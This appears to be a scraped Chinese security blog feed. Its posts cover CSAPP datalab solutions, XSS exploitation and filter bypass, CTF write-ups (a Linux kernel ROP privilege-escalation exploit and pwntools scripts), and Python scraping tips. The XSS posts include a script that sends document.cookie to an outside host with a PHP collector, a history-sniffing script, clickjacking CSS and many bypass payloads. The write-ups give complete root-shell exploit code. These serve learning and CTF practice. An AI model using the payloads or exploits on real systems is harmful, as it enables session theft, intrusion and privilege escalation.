12(实际为23点到明日0点或11点到12点)的过程,从过程来看就是发生了对最高位前一位的进位或借位. 浮点数的表示十进制小数不一定有对应的二进制小数表示,通常使用IEEE浮点表示. 即使用(-1)^s * M * 2^E来表示一个数.其中s表示符号,M表示尾数,E表示阶码.分别使用三个位段编码这三个数.(实际应用中存储的是处理后的数) 同样,由于数据结构大小的限制,浮点数也有可表达的范围,且也是离散的(比如0.1再计算机中存的值实际不为0.1). 不同的是浮点数用一些规定指示对于不同溢出结果的处理方式. 例如C语言单精度浮点数中阶码中位全为0指示非规格化的数,阶码位全为1而尾数位全为0的指示无穷大,阶码位全为1而尾数位不全为0的指示NaN(特殊值). 浮点运算缺乏结合性和分配性. 浮点数的舍入由于前面说的,计算机表示的浮点数是离散的,所以浮点运算只能近似的表示实数运算. 同样对于实数x需要通过舍入运算找到一个”最接近的”匹配值,才能用浮点形式表示出来. IEEE浮点格式定义了4种不同的舍入方式.(默认方法为找到最近匹配) 向偶数舍入,也称为向最接近的值舍入.在十进制中:其中1.4 -&gt; 1和1.6 -&gt; 2.而1.5(2.5) -&gt; 2.对于二进制则是最低有效位为0. 向下舍入 向上舍入 向零舍入 其他数据类型只要建立相应的解析规则(编码,解码方式)就能获得新的数据类型.包括建立在之前基础数据类型之上的.例如各种字符集. datalab填写bit.c,make btest生成,./btest检验.这一部分主要利用布尔代数的知识和基础编码知识. bitXor直接展开. x ^ y = ~((~(x &amp; ~y)) &amp; (~(~x &amp; y))). tmin直接返回0x80000000(依机器而异). isTmaxTmax满足Tmax == ~(Tmax + 1). allOddBits先掩码再检验,!((x &amp; 0xAAAAAAAA) ^ 0xAAAAAAAA). negate补码的负数运算为取反加一. isAsciiDigit减法判断结果是否为负再将判定结果与即可. (!(((x - 0x30) &amp; 0x80000000) &gt;&gt; 31)) &amp; (!(((0x39 - x) &amp; 0x80000000) &gt;&gt; 31)). conditional将x扩展,使用掩码即可. 1234int conditional(int x,int y,int z) &#123; x = (!!x) &lt;&lt; 31 &gt;&gt; 31; return (x &amp; y) | (~x &amp; z);&#125; isLessOrEqual相减测负数,但要避免正数减负数溢出的情况,再增加对相等的检测即可. 1234567int isLessOrEqual(int x, int y) &#123; int s = ((x &amp; ~y) &gt;&gt; 31) &amp; 1; //检测是否x负y正 int m = ~((x ^ y) &gt;&gt; 31); //检测是否x和y是否同符号 return s | (((m &amp; (x - y) &gt;&gt; 31) | !(x ^ y)) &amp; 1);&#125; logicalNeg通过0 == -0解出(虽然0x80000000 == -0x80000000但结果不同). ~(x | (~x + 1)) &gt;&gt; 31 &amp; 1. howManyBits通过x ^= (x &lt;&lt; 1)异或相邻的数,找出为1的最高位在哪一位就可以了. 12345678910int howManyBits(int x) &#123; int n = 0; x ^= (x &lt;&lt; 1); n += ((!!(x &amp; ((~0) &lt;&lt; (n + 16)))) &lt;&lt; 4); n += ((!!(x &amp; ((~0) &lt;&lt; (n + 8)))) &lt;&lt; 3); n += ((!!(x &amp; ((~0) &lt;&lt; (n + 4)))) &lt;&lt; 2); n += ((!!(x &amp; ((~0) &lt;&lt; (n + 2)))) &lt;&lt; 1); n += (!!(x &amp; ((~0) &lt;&lt; (n + 1)))); return n + 1;&#125; floatScale2两种特殊情况,uf为非规格化小数或0时(即exp == 0);为NaN或INF时(即exp == 255); 正常情况若结果++exp为INF时,保证其不为NaN,即小数部分全为0. 123456789unsigned floatScale2(unsigned uf) &#123; int exp = (uf &amp; 0x7f800000) &gt;&gt; 23; int s = uf &amp; 0x80000000; if(exp == 0) return (uf &lt;&lt; 1) | s; if(exp == 255) return uf; ++exp; if(exp == 255) return 0x7f800000 | s; return (uf &amp; 0x807fffff) | (exp &lt;&lt; 23);&#125; floatFloat2Int按照IEEE规则解析即可. 1234567891011121314int floatFloat2Int(unsigned uf) &#123; int s = uf &gt;&gt; 31; int exp = ((uf &amp; 0x7f800000) &gt;&gt; 23) - 127; int frac = (uf &amp; 0x007fffff) | 0x00800000; if(!(uf &amp; 0x7fffffff)) return 0; if(exp &gt; 31) return 0x80000000; if(exp &lt; 0) return 0; if(exp &gt; 23) frac &lt;&lt;= (exp - 23); else frac &gt;&gt;= (23 - exp); if(!((frac &gt;&gt; 31) ^ s)) return frac; else if(frac &gt;&gt; 31) return 0x80000000; else return ~frac + 1;&#125; floatPower2考虑exp &lt; -127和exp &gt; 128,分别返回0和0x7f800000. 1234567unsigned floatPower2(int x) &#123; if(x &lt; -127) return 0; if(x &gt; 128) return 0x7f800000; x += 127; x = x &lt;&lt; 23; return x;&#125;]]></content>
      <categories>
        <category>CS</category>
        <category>basis</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[web安全-XSS-利用]]></title>
    <url>%2Fposts%2Fffac2f01%2F</url>
    <content type="text"><![CDATA[Cookie窃取和会话劫持Cookie是浏览器和web系统一起设置的用于对用户进行身份识别和会话追踪的机制.其本质是网站存储在用户机器上的小文本文件. Cookie分存储在硬盘上的持久型Cookie,由浏览器存取,其生存时间由创建时参数决定.和存储在内存中的临时型Cookie,也称为会话Cookie,关闭浏览器则消失. Set-cookie:http响应头,向客户端发送cookie. Expires = date:Expires确定了cookie的有效终止日期,可选.缺省则cookie在浏览器内存中. Domain = domain-name:确定了哪些Internet域中的web服务器可读取浏览器储存的cookie,缺省为该web服务器域名. Path = path:定义了web服务器哪些路径下的页面可获取服务器发送的cookie. Secure:在cookie中标记该变量,表明只有为https通信协议时,浏览器才向服务器提交cookie. Httponly:禁止javascript读取cookie. JS可以使用document.cookie访问到当前页面访问网站的Cookie(未开Httponly). 1&lt;script&gt;document.location = "http://www.test.com/cookie.php?cookie=" + document.cookie&lt;/script&gt; 然后在网站后端收集Cookie. 123456&lt;?php $cookie = $_GET['cookie']; $log = fopen("cookie.txt","a"); fwrite($log,$cookie."\n"); fclose($log)?&gt; Session与Cookie最大的区别为,Session保存在服务器端的内存当中,也是用来识别用户身份和维持会话的. 会话概念一般是基于Cookie的,会话劫持本质实在攻击中带上了被攻击者的Cookie并发送到服务端. 可以利用XMLHttpRequest发送POST请求(还可以js构造form表单并提交). 网络钓鱼利用受害者心理弱点进行诈骗,一般使用钓鱼页面,HTML注入,Iframe钓鱼和Flash钓鱼. 点击劫持.实际上是一种视觉上的欺骗. 123456789101112131415iframe &#123; width: ; height: ; /* 控制大小 */ position: absulute; top: ; left: ; /* 控制位置 */ z-index: 2; /* 使iframe处于最上层 */ -moz-opacity: 0.5; opacity: 0.5; filter: alpha(opacity=0) /* 隐藏 */&#125; 图片覆盖攻击与之类似,控制图片的style,例如:style=position:absolute;right:320px;top:90px;. History HackCSS中由4个伪类来定义链接的样式,分别是a:link,a:visited,a:active和a:hover,对应未访问的,已访问的,激活的和光标悬停的. 利用样式可以分别出用户是否访问过一个链接. 1234567891011121314151617181920212223var websites = ["http://www.baidu.com/"];//...for(var i = 0;i &lt; websites.length;i++) &#123; var link = document.createElement("a"); link.id = "id" + i; link.href = websites[i]; link.innerHTML = websites[i]; document.write('&lt;style&gt;'); document.write('#id' + i + ":visited &#123;color:#FF0000&#125;"); document.write('&lt;/style&gt;'); document.body.appendChild(link); var color = document.defaultView.getComputedStyle(link,null).getPropertyValue("color"); document.body.removeChild(link); if(color == "rgb(255,0,0)") &#123; var item = document.createElement('li'); item.appendChild(link); document.getElementByIf('visited').appendChild(item); &#125; else &#123; var item = document.createElement('li'); item.appendChild(link); document.getElementByIf('notvisited').appendChild(item); &#125;&#125; XSS WormXSS Worm使用了大量Ajax技术和DOM节点操作,其攻击原理是利用某网站的XSS漏洞,针对该网站编写XSS Worm并创建一个传播源头,之后每一个访问源头的用户都会触发该XSS Worm,XSS Worm会判断该用户登陆状态,如果登录且未被感染就进行感染,一般在社交网站这种互动性强,人流量大的地方危害性大. 自动扫描工具Arachni.mozilla-http-observatory.w3af.Acunetix Web Vulnerability Scanner. XSS漏洞利用工具AttackAPI,Anehta. xss-gameXSS gamealert(1) to winprompt(1) to win XSS gameLevel 1:&lt;script&gt;alert(&quot;1&quot;)&lt;/script&gt;.Level 2:&lt;img src=&quot;/flag&quot; onerror=&quot;alert(1)&quot;&gt;.Level 3:&#39;xxs.jpg&#39; onerror=&#39;alert(&quot;xss&quot;)&#39;/&gt;.Level 4:直接注入标签,3&#39;);alert(&#39;XSS.Level 5:signup页面跳转通过next变量,?next=javascript:alert(&#39;XSS&#39;);.Level 6:将参数改成外部的一个js文件,内容为alert(&#39;XSS&#39;). alert(1) to winWarmup:闭合&quot;,1&quot;);alert(1);alert(&quot;.Adobe:闭合&lt;script&gt;标签,&lt;/script&gt;&lt;script&gt;alert(1)//.JSON:&lt;/script&gt;&lt;script&gt;alert(1)//.]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-强网杯-2018-core]]></title>
    <url>%2Fposts%2F9dbf0ed8%2F</url>
    <content type="text"><![CDATA[分析先解包. 123mv core.cpio ./core.cpio.gzgunzip core.cpio.gzcpio -idmv &lt; core.cpio 修改init删除定时关机,然后重新打包. 1./gen_cpio.sh core.cpio 遇到内存不足不断重启,修改start.sh里64M为128M. 分析core.ko,ioctl系统调用会根据传入的文件描述符去调用文件自己定义的ioctl系统,这里为core_ioctl. 123456789101112131415161718192021__int64 __fastcall core_ioctl(__int64 a1, __int64 a2, __int64 a3)&#123; __int64 v3; // rbx v3 = a3; switch ( (_DWORD)a2 ) &#123; case 0x6677889B: core_read(a3, a2); break; case 0x6677889C: printk(&amp;unk_2CD, a3); off = v3; break; case 0x6677889A: printk(&amp;unk_2B3, a2); core_copy_func(v3); break; &#125; return 0LL;&#125; 漏洞点在core_copy_func,存在整数溢出. 漏洞利用思路为设置off后利用core_read来leak canary,然后write将payload写入name全局变量,最后core_copy栈溢出劫持控制流.劫持的控制流是进入内核态的,可以commit_creds(prepare_kernel_cred(0));提权然后返回用户态getshell. init时kallsyms的内容保存到了/tmp/kallsyms,找到commit_creds和prepare_kernel_cred的地址 1234/ $ cat /tmp/kallsyms | grep commit_credsffffffff9cc9c8e0 T commit_creds/ $ cat /tmp/kallsyms | grep prepare_kernel_credffffffff9cc9cce0 T prepare_kernel_cred core.ko开了canary和nx,内核开了kaslr没有开smep. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/types.h&gt;#define COMMAND_READ 0x6677889B#define COMMAND_PRINT 0x6677889C#define COMMAND_COPY 0x6677889Aunsigned long user_cs, user_ss, user_rflags;static void save_state()&#123; asm( "movq %%cs, %0\n" "movq %%ss, %1\n" "pushfq\n" "popq %2\n" : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags) : : "memory" );&#125;//at&amp;t assembly//内核返回用户态时会调用iretq,iretq会依次弹出rip,cs,eflags,rsp,ss之后做一些判断,进入内核态前存储这些参数用来构造payload.unsigned long long commit_creds_addr = 0;unsigned long long prepare_kernel_cred_addr = 0;void set_uid()&#123; char * (* pkc)(int) = prepare_kernel_cred_addr; void (* cc)(char *) = commit_creds_addr; (* cc)((* pkc)(0));&#125;//commit_creds(prepare_kernel_cred(0));提权void getshell()&#123; system("/bin/sh");&#125;int main(int argc,char ** argv)&#123; printf("prepare_kernel_cred: "); scanf("%llx", &amp;prepare_kernel_cred_addr); printf("commit_creds: "); scanf("%llx", &amp;commit_creds_addr); char s[100]; char * leak = (char *)malloc(1024); int fd = open("/proc/core", O_RDWR); ioctl(fd, COMMAND_PRINT, 0x40); ioctl(fd, COMMAND_READ, leak); unsigned long long canary = ((unsigned long long *)leak)[0]; unsigned long long ret_addr = ((unsigned long long *)leak)[2]; unsigned long long iret_addr = prepare_kernel_cred_addr - 0x4c21e; save_state(); unsigned long long rop_chain[]=&#123; 0x9090909090909090, 0x9090909090909090, 0x9090909090909090, 0x9090909090909090, 0x9090909090909090, 0x9090909090909090, 0x9090909090909090, 0x9090909090909090, canary, 0x9090909090909090, &amp;set_uid, //提权 ret_addr - 0xc5, //swapgs_ret &amp;s - 0x100, //rbp iret_addr, //返回用户态 &amp;getshell, //rip user_cs, //cs user_rflags, //rflags &amp;s - 0x100, //rsp user_ss //ss &#125;; write(fd, rop_chain, 1024); ioctl(fd, COMMAND_COPY, 0xff00000000000100); return 0;&#125; 编译exp,拷贝到/tmp目录 1gcc -Os -static exp.c -lutil -o exp 重新打包cpio 1find . | cpio -o -H newc | gzip &gt; ../core.cpio 启动内核运行exp,因为开了kaslr,手动输入prepare_kernel_cred,commit_creds地址.]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[web安全-XSS-基础]]></title>
    <url>%2Fposts%2Ff844f6ae%2F</url>
    <content type="text"><![CDATA[概览XSS即跨站脚本攻击Cross-site scripting,缩写和CSS重名,所以改为XSS. 指攻击者利用网站漏洞将恶意的脚本代码(包括HTML代码和JavaScript等富客户端脚本语言)注入到网页之中,诱使其他用户访问这个页面从而执行其中的恶意代码.(浏览器中有javascript解释器) 分类反射型XSS:也叫做非持久型XSS,参数型XSS.即将恶意代码附在URL中,只作用在前端,一般是搜索框,用户登录,窃取用户cookie或进行钓鱼欺骗,POST的内容也可以触发反射型XSS. 持久型XSS:也叫做存储型XSS.即恶意代码会被存储到服务器端的数据库,一般是留言板,评论,博客日志的数据. DOM型XSS:DOM型XSS不按照数据是否存储在服务端来划分,从效果上DOM-Based XSS也是一种反射型XSS.通过修改页面的DOM节点形成的XSS,称之为DOM-Based XSS,DOM型XSS取出和执行恶意代码由浏览器端完成,不与服务端交互. 从前后端交互的角度来看:DOM型和反射型经过后端不经过数据库;存储型经过后端经过数据库. 具体payload可以自行搜索xss cheat sheet.比如:https://gbhackers.com/top-500-important-xss-cheat-sheet/. 浏览器解析浏览器接收到一个HTML文档时,首先是HTML解析器对HTML文档进行词法解析,这一过程完成HTML解码并创建DOM树,接下来JavaScript解析器会介入对内联脚本进行解析,同时如果遇到需要URL的上下文环境,URL解析器就会介入并完成URL的解码工作,URL解析器的解码顺序会根据URL所在位置不同,可能在JavaScript解析器之前或之后解析. HTML字符实体:呈现HTML页面时,如果直接使用特殊字符如&lt;或&gt;,浏览器会误以为它们是标签的开始或结束,若想正确的在HTML页面呈现特殊字符就需要用到其对应的字符实体.字符实体是一个预先定义好的转义序列,以&amp;开头,以分号结束.如&lt;的实体名称为&amp;lt;,实体编号为&amp;#60;,字符都有实体编号,但有些字符没有实体名称. JavaScript编码最常用的有Unicode转义序列,URL编码即%加字符的ASCII编码对应的2位16进制数字. &lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;解析顺序:HTML解码,URL解码,JS解码. 绕过XSS-Filter最简单的注入方式有: 在HTML中内嵌的文本中,恶意内容以&lt;script&gt;标签形成注入; 在内联的JavaScript中,拼接的数据突破了原本的限制(字符串,变量,方法名等); 在标签属性中,恶意内容包含引号,从而突破属性值的限制,注入其他属性或者标签; 以上攻击方式通常都伴随着标签闭合,闭合优先级高于双引号完整性优先级的特殊标签:&lt;!--,&lt;iframe&gt;,&lt;noframes&gt;,&lt;noscript&gt;,&lt;script&gt;,&lt;style&gt;,&lt;textarea&gt;,&lt;title&gt;,&lt;xmp&gt;. 当后端对输入进行检测时就需要绕过XSS-Filter. Javascript伪协议利用HTML标签属性值执行XSS,需要浏览器(例如IE6)支持Javascript伪协议. 不是所有标记的属性值都能产生XSS,通常只有引用文件的属性才能触发XSS. 1234&lt;table background="javascript:alert(/xss/)"&gt;&lt;/table&gt;&lt;table background="jAvascript:alert(/xss/)"&gt;&lt;/table&gt;&lt;table background="%20jAvascript:alert(/xss/)"&gt;&lt;/table&gt;&lt;!-- 还有href,background,action,src,lowsrc,bgsound.value,dynsrc等属性 --&gt; 字符编码绕过html标签支持html实体编码;支持十六进制,以&amp;#x{0}*开头(x大小写皆可);支持十进制,以&amp;#{0}*开头;后缀有没有;皆可. 可以将&amp;#01,&amp;#02等字符插入JS和Vbs代码头部,将&amp;#9(TAB),&amp;#10(\n),&amp;#13插入任何地方(\r).(ASCII码绕过) 样式表也支持分析和解释\连接的十六进制字符串形式. javascript的eval函数,支持十六进制,以\x开头,x只能小写且必须两位;支持八进制,以\开头,必须两位;支持\u前缀的unicode,必须四位.也可以结合String.fromCharCode()函数使用. javascript本身支持unicode,escapes,十六进制,八进制等编码形式. Microsoft提供脚本加密机制,包括JScript和VBScript. 12345&lt;iframe onload = VBScript&amp;#46;Encode:(*)&gt;&lt;!-- or --&gt;&lt;script language="JScript.Encode"&gt;(*)&lt;/script&gt; 利用事件W3C将事件分为用户接口(鼠标,键盘),逻辑(处理的结果),变化(对文档进行修改). 1&lt;img src="#" onerror=alert(/xss/)&gt; 利用CSS跨站利用CSS跨站剖析攻击,但各浏览器不能通用,不过CSS样式表可以使用@import和link的方式远程引用(@import还可以直接执行代码). 1234567&lt;div style = "background-image:url(javascript:alert('XSS'))"&gt;&lt;!-- or --&gt;&lt;style&gt; body &#123;background-image: url("javascript:alert('XSS')");&#125;&lt;/style&gt;&lt;!-- IE5及以后版本支持在CSS中使用expression --&gt;&lt;div style = "width: expression(alert('XSS'));"&gt; 拆分拼接法当网站限制输入长度时可以使用一个字符串变量将代码拆分,然后使用eval执行.(或者相同思路) UTF-7 BOM XSSUTF-7指7位元Unicode转换格式,使用+,-符号控制编码的开始和结束. BOM指字节顺序标记,是插入到以UTF-8,UTF-16,UTF-16,UTF-32编码的Unicode文件开头的特殊标记,用来识别Unicode文件的编码类型. 如果返回的字符集限制不严格,就可以通过注入+/v8,+/v9,+/v+,+/v/这几个关键字(utf-7 bom)让浏览器以UTF-7解析文件从而绕过检测进行XSS(其实插入&lt;meta charset=&quot;utf-7&quot;&gt;也行,不过&lt;和&gt;容易被过滤). HTTP Response Splitting又称为CRLF注入,其中CR -&gt; &#39;\r&#39;,LF -&gt; &#39;\n&#39;,原理是在HTTP Headers中\r\n就是分隔符,类似C语言中的;. 如果用户输入与HTTP Response有关且未过滤\r\n攻击者可以在HTTP Response中注入HTTP Header,例如Set-Cookie. Data URIs XSS利用data:text/html;base64注入XSS代码即可,不过图片标签需要单击才能触发,可以使用&lt;object&gt;标签(iframe,anchor等也支持Data URIs). Cookie XSS当用户输入可以影响到cookie且cookie内容会被输出到页面中时,就可以将恶意代码注入到cookie中.当然不止cookie,其他本地存储对象也可以(Cookie有容量限制). 其他还有比如大小写混淆,使用单引号或不使用引号.使用expression时可以构造不同的全角字符绕过.运用/**/,&lt;!-- --&gt;,&lt;comment&gt;&lt;/comment&gt;(只支持IE系列浏览器)注释字符绕过黑名单.样式表中的\和\0会被浏览器忽略.对关键字进行转码处理:e -&gt; \65(\065) IE6中标记和属性用/分开. 1&lt;img/src = "javascript:alert('xss');"&gt; IE嗅探机制会导致其自动解析一些脚本(无视文件后缀). Unleashing an Ultimate XSS Polyglot源于Unleashing an Ultimate XSS Polyglot的payload. 1jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e 能够检测到存在于HTML属性,HTML文字内容,HTML注释,跳转链接,内联JavaScript字符串,内联CSS样式表等多种上下文中的XSS漏洞,也能检测eval(),setTimeout(),setInterval(),Function(),innerHTML,document.write()等DOM型XSS漏洞,并且能绕过一些XSS过滤器. CSP Bypass对于header(&quot;Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39; &quot;);这种规则,只允许加载当前域的js,可以配合文件上传漏洞上传js内容. CSP除了阻止不可信js的解析以外,还可以阻止向不可信域的请求,比如尝试加载外域的图片也会被阻止,可以通过预加载绕过(这个主要是因为浏览器对CSP的支持不完整). 1234&lt;link rel="prefetch" href="http://aaa.cn"&gt;&lt;!-- (H5预加载)(only chrome) --&gt;&lt;link rel="dns-prefetch" href="http://aaa.cn"&gt;&lt;!-- (DNS预加载) --&gt; 对于header(&quot;Content-Security-Policy: default-src &#39;self&#39;; script-src http://127.0.0.1/static/ &quot;);这种规则,如果可信域没有上传,可以找可控的重定向文件,绕过目录限制. 当开发者使用jsonp来跨域获取数据,就可以通过callback构造任意js.通过类似href的跨域请求也可以绕过.在通过跨协议调用js时,发送的http请求里Referer为空. HTML5HTML5新增了特性也同时新增了攻击面,HTML5sec是一群安全研究者建立的项目.]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-nuaactf-2018]]></title>
    <url>%2Fposts%2F4721d192%2F</url>
    <content type="text"><![CDATA[overflow程序逻辑很简单,一个栈溢出,但是有一个类似canary的检测,用的检测值是C语言的rand()生成,不过这个是伪随机数,通过srand()设置随机数种子. 这里用的随机数种子是time(0),在C语言中可以通过time()函数获取到当前的秒数,参数为0则函数返回值即为结果,若参数不为0则结果保存在参数中. 所以只要同一秒作为种子生成rand()就可以获得检测值. 1.c 12345678#include&lt;time.h&gt;#include&lt;stdlib.h&gt;#include&lt;stdio.h&gt;int main()&#123; srand(time(0)); printf("%p",rand());&#125; payload 123456789101112131415from pwn import *context.log_level = 'debug's = process("./1")#r = process("./overflow")r = remote("ctf.asuri.org","20001")mi = s.recv()mi = int(mi,16)print hex(mi)payload = 0x20 * 'a' + p32(mi) + p32(0x80485BD) * 4r.send(payload)r.interactive() password_checker漏洞出现在snprintf函数的返回值,其返回值一直等于需要输出的长度,也就是虽然n会限制输出到s,但是可以通过控制v0来写返回地址. 123456789101112from pwn import *r = remote("ctf.asuri.org","20002")#r = process("./pwn")payload = 0x106 * 'a'r.send(payload)payload = p32(0x8048674)r.send(payload)r.interactive() type_confusion程序逻辑里会see调用class的第一个指针,c1的是打印字符串,o2的就是system(&quot;sh&quot;). 所以只要free一个c1然后用100分配一个o2,see一下获得shell middle逆向处理字符的汇编代码获得处理过程,通过宏获得异或值,打表对应check值获得flag plot绘图获得flag. 1234567891011121314import matplotlib.pyplot as pltf = open("plot.txt")x = [0]y = [0]for n in range(1,1044): line = f.readline() list1 = line.split(" ", 1) x.append(float(list1[0])) y.append(float(list1[1]))plt.plot(x, y) f.close()plt.show() fs密码在文件末尾,打开dmg文件获得flag. dmg文件是mac的一种镜像文件,在mac中可以直接打开.]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[develop-python-小技巧]]></title>
    <url>%2Fposts%2F70fc7b52%2F</url>
    <content type="text"><![CDATA[0x00记录一些好用,轻量的python库. PySocks设置代理. 12345import socksimport socketsocks.set_default_proxy(socks.SOCKS5, "localhost", 9150)socket.socket = socks.socksocket 解析JSON访问API会返回XML或JSON格式的数据,可以用标准库解析 123456import jsonfrom urllib.request import urlopenresponse = urlopen(url).read().decode('utf-8')Json = json.loads(response)return Json.get(key) 下载文件123from urllib.request import urlretrieveurlretrieve(url, "path") 发送邮件1234567891011import smtplibfrom email.mime.text import MIMETextmsg = MIMEText("111")msg["Subject"] = "An Email"msg["From"] = ""msg["To"] = ""s = smtplib.SMTP('localhost')s.send_message(msg)s.quit() python单元测试实现unittest模块的TestCase类,为每个单元测试提供setUp和tearDown函数,提供不同类型的断言语句让测试成功或者失败,所有需要单元测试的函数以test_开头. 123456789101112131415import unittestclass TestAdd(unittest.TestCase): def setUp(self): print("setUp") def tearDown(self): print("tearDown") def test_Add(self): a = 2 + 2 self.assertEqual(4,a)if __name__ == '__main__': unittest.main() 读写Excel表格需求库:读Excel的xlrd库和写Excel的xlwt库. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647# -*- coding: utf-8 -*- import xlrdimport xlwtdef open_excel(file = 'test.xlsx'): try: data = xlrd.open_workbook(file) return data except Exception,e: print str(e)def excel_table_byindex(file = 'test.xlsx', index = 0): data = open_excel(file) table = data.sheets()[index] # table = data.sheet_by_name("test") nrows = table.nrows ncols = table.ncols list =[] for rownum in range(0, nrows): row = table.row_values(rownum) if row: new_row = [] for i in range(len(row)): new_row.append(row[i]) list.append(new_row) testXlwt('new.xls', list) return listdef testXlwt(file = 'new.xls', list = []): book = xlwt.Workbook() sheet1 = book.add_sheet('hello') i = 0 for app in list: j = 0 for k in app: sheet1.write(i, j, k) j = j + 1 i = i + 1 book.save(file)def main(): tables = excel_table_byindex() for row in tables: print rowif __name__=="__main__": main()]]></content>
      <categories>
        <category>develop</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[develop-scapy-基础]]></title>
    <url>%2Fposts%2F3585c51d%2F</url>
    <content type="text"><![CDATA[思维导图 Requests当存在表单提交时可以使用Requests库 具体json参数数据格式可以通过GET请求的url或者F12看POST的params获得 12345678910111213import requestsparams = &#123;'key1':'value1','key2':'value2',...&#125;r = requests.post("url",data = params)print(r.text)file = &#123;'key':open('path/filename','rb')&#125;r = requests.post("url",files = file)cookies = r.cookiesprint(cookies.get_dict())r = requests.post("url",cookies = cookies)#使用delete_cookie(),add_cookie(),delete_all_cookie等方法处理会话cookie 由于cookie可能被网站经常更换,所以使用session更为方便. 12345678import requestsheaders = &#123;...&#125;session = requests.Session()...s = session.post("url",data = params,headers = headers)#伪造headers使你看着不像爬虫 session对象会持续跟踪会话信息(如cookie,header等),也可以访问这些信息:print(s.cookies.get_dict()). 还有HTTP基本接入认证. 1234567import requestsfrom requests.auth import AuthBasefrom requests.auth import HTTPBasicAuthauth = HTTPBasicAuth('name','password')r = requests.post(url = 'url',auth = auth)print(r.text) BeautifulSoup解析HTML1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950from urllib.request import urlopenfrom bs4 import BeautifulSoupfrom urllib.error import HTTPErrordef parser(url): try: html = urlopen(url) #获取request对象 text = html.read() #读取html信息 except HTTPError as e: #错误捕获 print(e) bsObj2 = BeautifulSoup(text,"html.parser") #解析html信息 content = bsObj2.find("div",&#123;"id":"content"&#125;) #属性对应的值可以用正则替代,或者直接使用lambda表达式作为参数 f.write('\n') f.write('\n ') f.write(content.get_text('\n ','&lt;br/&gt;')) #get_text()会清除所有标签,可通过参数选择替代字符 f.write('\n') f.write('\n')base = "https://www.qu.la"book = "/book/394/"try: html = urlopen(base + "/book/394/") text = html.read()except HTTPError as e: print(e)bsObj = BeautifulSoup(text,"html.parser")List = bsObj.findAll("div",&#123;"id":"list"&#125;)#List = bsObj.findAll("div",id = "list")#返回一个数组,find返回第一个f = open(bsObj.h1.get_text() + ".txt","w")page = List[0].findAll("dd")for i in page: f.write(i.a.get_text()) link = i.a.attrs["href"] #访问tag的属性 if book in link: parser(base + link) else: parser(base + book + link) print(i.a.get_text()) BeautifulSoupBeautifulSoup中有四种对象.BeautifulSoup对象,Tag对象,Conment对象(查找注释标签)和NavigableString对象. 其中BeautifulSoup对象把标签组织为一颗树(就像DOM树).每棵树有例如children,descendants,next_siblings,previous_siblings和parent等属性. 编码问题现常用的编码方式:ASCII,Unicode(UTF-8,UTF-16等),新的ISO字符集(ISO-8859-[0-127]) 字符串显示转化:str(html.read(),&quot;UTF-8&quot;) 使用bs4和python3.x 123content = bsObj.find("dd").get_text()content = bytes(content, "UTF-8")content = content.decode("UTF-8") SeleniumSelenium可以结合第三方浏览器执行JavaScript,可以结合无头浏览器PhantomJS使用. 1234567891011121314151617181920212223242526from selenium import webdriver#selenium.webdriver.ActionChains,selenium.webdriver.common.keys,selenium.webdriver.remote.webelementimport time#service_args = ['--proxy = localhost:9150','--proxy-type = socks5']#用于设置代理driver = webdriver.PhantomJS(executable_path = 'path')driver.get("url")time.sleep(3)#等待页面加载content = driver.find_element_by_id('content')#复数选择器find_elements_by_idcontent.is_displayed()#检测是否为隐含字段print(content.text)#元素其他属性或方法:click(),click_and_hold(),release(),double_click(),send_keys_to_element("aaa")等#多个方法执行可以使用ActionChains(driver).click(element).send_keys(keys.RETURN)...#使用pagesource返回网页源代码而不是转化过的以此解析htmldriver.close() 上面是显式等待,下面使用隐式等待来监听expected_conditions(DOM的触发状态). 12345678910111213from selenium.webdriver.common.by import By#定位器:ID,CLASS_NAME,CSS_SELECTOR,LINK_TEXT,PARTIAL,NAME,TAG_NAME,XPATHfrom selenium.webdriver.support.ui import WebDriverWaitfrom selenium.webdriver.support import expected_conditions as ECdriver = webdriver.PhantomJS(executable_path = 'path')driver.get("http://pythonscraping.com/pages/javascript/ajaxDemo.html")try: element = WebDriverWait(driver,10).until(EC.presence_of_element_located((By.ID,"loadedButton")))finally: print(driver.find_element_by_id("content").text) driver.close() 通过监视DOM元素来捕获StaleElementReferenceException异常来检测重定向的完成. 123456elem = driver.find_element_by_tag_name("html")...try: elem == driver.find_element_by_tag_name("html")except StaleElementReferenceException: return 爬虫实例参考:https://juejin.im/post/58dce2248d6d8100613a4cfb. http.cookiejar模块可用于自动处理HTTP Cookie,http.cookiejar.LWPCookieJar对象就是对cookies的封装,支持把cookies保存到文件以及从文件中加载. 1234567from http import cookiejarsession = requests.session()session.cookies = cookiejar.LWPCookieJar(filename='cookies.txt')try: session.cookies.load(ignore_discard=True)except LoadError: print("load cookies failed") 获取知乎用于防御csrf的token. 12345def get_xsrf(): response = session.get("https://www.zhihu.com", headers=headers) soup = BeautifulSoup(response.content, "html.parser") xsrf = soup.find('input', attrs=&#123;"name": "_xsrf"&#125;).get("value") return xsrf 获取验证码并人工识别. 123456789101112def get_captcha(): """ 